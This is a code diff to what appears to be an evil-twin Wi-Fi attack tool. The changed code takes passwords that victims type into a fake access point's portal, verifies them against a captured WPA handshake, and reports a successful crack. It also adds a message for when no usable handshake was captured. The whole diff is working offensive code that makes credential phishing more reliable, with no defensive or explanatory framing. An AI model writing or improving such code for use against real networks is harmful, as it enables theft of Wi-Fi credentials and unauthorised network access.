@@ -200,7 +200,7 @@ class EvilTwinAttack(BaseAttacker):
         try:
             while True:
                 if self.esp.captured_password:
-                    raw_pass = self.esp.captured_password.strip()
+                    raw_pass = self.esp.captured_password.rstrip("\r\n")
                     self.esp.captured_password = None
 
                     print(f"\n{C_CYAN}[+] Password attempt: '{raw_pass}'{C_RESET}")
@@ -215,7 +215,8 @@ class EvilTwinAttack(BaseAttacker):
                         continue
 
                     print(f"{C_YELLOW}[*] Verifying password...{C_RESET}")
-                    if verify_password(self.handshake_file, self.bssid, self.ssid, raw_pass):
+                    result = verify_password(self.handshake_file, self.bssid, self.ssid, raw_pass)
+                    if result is True:
                         print(f"\n{C_GREEN}{'=' * 70}{C_RESET}")
                         print(f"{C_GREEN}[!!!] PASSWORD CRACKED SUCCESSFULLY [!!!]{C_RESET}")
                         print(f"{C_GREEN}{'=' * 70}{C_RESET}")
@@ -241,7 +242,11 @@ class EvilTwinAttack(BaseAttacker):
                         print(f"{C_GREEN}[+] Attack completed successfully!{C_RESET}")
                         return
                     else:
-                        print(f"{C_RED}[-] Password incorrect{C_RESET}")
+                        if result is None:
+                            print(f"{C_RED}[!] No usable handshake in the capture — cannot verify '{raw_pass}'.{C_RESET}")
+                            print(f"{C_YELLOW}    Re-capture the handshake first, then run the attack again.{C_RESET}")
+                        else:
+                            print(f"{C_RED}[-] Password incorrect{C_RESET}")
                         self.esp.send_no()
 
                 time.sleep(0.1)
